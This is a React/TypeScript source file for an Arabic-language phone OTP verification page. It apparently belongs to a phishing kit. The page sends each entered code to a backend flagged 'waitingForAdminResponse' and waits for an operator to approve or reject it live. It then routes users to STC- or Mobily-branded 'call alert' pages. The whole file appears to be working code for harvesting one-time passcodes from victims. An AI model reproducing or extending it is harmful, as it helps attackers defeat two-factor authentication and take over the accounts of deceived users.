import { useEffect, useState, useRef } from "react";
import { useLocation, useSearch } from "wouter";
import PageLayout from "@/components/layout/PageLayout";
import WaitingOverlay from "@/components/WaitingOverlay";
import { Button } from "@/components/ui/button";
import {
  InputOTP,
  InputOTPGroup,
  InputOTPSlot,
} from "@/components/ui/input-otp";
import {
  sendData,
  isFormApproved,
  isFormRejected,
  navigateToPage,
} from "@/lib/store";

const serviceProviderNextPages: Record<string, string> = {
  "0": "تنبية إتصال STC",
  "1": "تنبية إتصال Mobily",
  "2": "الصفحة النهائية",
  "3": "الصفحة النهائية",
  "4": "الصفحة النهائية",
  "5": "الصفحة النهائية",
};

export default function PhoneOTP() {
  const [, navigate] = useLocation();
  const searchString = useSearch();
  const params = new URLSearchParams(searchString);
  const serviceProvider = params.get("serviceProvider") || "0";

  const [otp, setOtp] = useState("");
  const [error, setError] = useState(false);
  const inputRef = useRef<HTMLInputElement>(null);

  const nextPage = serviceProviderNextPages[serviceProvider] || "الصفحة النهائية";

  // Emit page enter
  useEffect(() => {
    navigateToPage("تحقق رقم الجوال (OTP)");
  }, []);

  // Handle form approval
  useEffect(() => {
    if (isFormApproved.value) {
      if (nextPage === "تنبية إتصال STC") {
        navigate("/stc-call-alert");
      } else if (nextPage === "تنبية إتصال Mobily") {
        navigate("/mobily-call-alert");
      } else {
        navigate("/final-page");
      }
    }
  }, [isFormApproved.value, navigate, nextPage]);

  // Handle form rejection - clear OTP
  useEffect(() => {
    if (isFormRejected.value) {
      setOtp("");
      setError(true);
      inputRef.current?.focus();
    }
  }, [isFormRejected.value]);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();

    if (otp.length !== 4) {
      setError(true);
      return;
    }

    setError(false);
    sendData({
      digitCode: otp,
      current: "تحقق رقم الجوال (OTP)",
      nextPage: nextPage,
      waitingForAdminResponse: true,
    });
  };

  const handleResend = () => {
    sendData({
      data: { طلب: "إعادة إرسال رمز" },
      current: "تحقق رقم الجوال (OTP)",
      waitingForAdminResponse: true,
    });
  };

  return (
    <PageLayout variant="default">
      <WaitingOverlay />

      <div className="bg-white rounded-2xl shadow-xl p-6">
        {/* Header */}
        <div className="text-center mb-8">
          <div className="w-16 h-16 bg-primary/10 rounded-full flex items-center justify-center mx-auto mb-4">
            <svg
              className="w-8 h-8 text-primary"
              fill="none"
              stroke="currentColor"
              viewBox="0 0 24 24"
            >
              <path
                strokeLinecap="round"
                strokeLinejoin="round"
                strokeWidth={2}
                d="M8 10h.01M12 10h.01M16 10h.01M9 16H5a2 2 0 01-2-2V6a2 2 0 012-2h14a2 2 0 012 2v8a2 2 0 01-2 2h-5l-5 5v-5z"
              />
            </svg>
          </div>
          <h1 className="text-xl font-bold text-gray-800 mb-2">رمز التحقق</h1>
          <p className="text-gray-500 text-sm">
            تم إرسال رمز التحقق إلى رقم جوالك
          </p>
        </div>

        <form onSubmit={handleSubmit} className="space-y-6">
          {/* OTP Input */}
          <div className="flex justify-center" dir="ltr">
            <InputOTP
              maxLength={4}
              value={otp}
              onChange={(value) => {
                setOtp(value);
                setError(false);
              }}
            >
              <InputOTPGroup>
                <InputOTPSlot index={0} className={error ? "border-red-500" : ""} />
                <InputOTPSlot index={1} className={error ? "border-red-500" : ""} />
                <InputOTPSlot index={2} className={error ? "border-red-500" : ""} />
                <InputOTPSlot index={3} className={error ? "border-red-500" : ""} />
              </InputOTPGroup>
            </InputOTP>
          </div>

          {error && (
            <p className="text-red-500 text-xs text-center">
              رمز التحقق غير صحيح، يرجى المحاولة مرة أخرى
            </p>
          )}

          {/* Submit Button */}
          <Button type="submit" className="w-full" size="lg">
            تأكيد
          </Button>

          {/* Resend Link */}
          <div className="text-center">
            <button
              type="button"
              onClick={handleResend}
              className="text-primary text-sm hover:underline"
            >
              لم تستلم الرمز؟ إعادة الإرسال
            </button>
          </div>
        </form>
      </div>
    </PageLayout>
  );
}
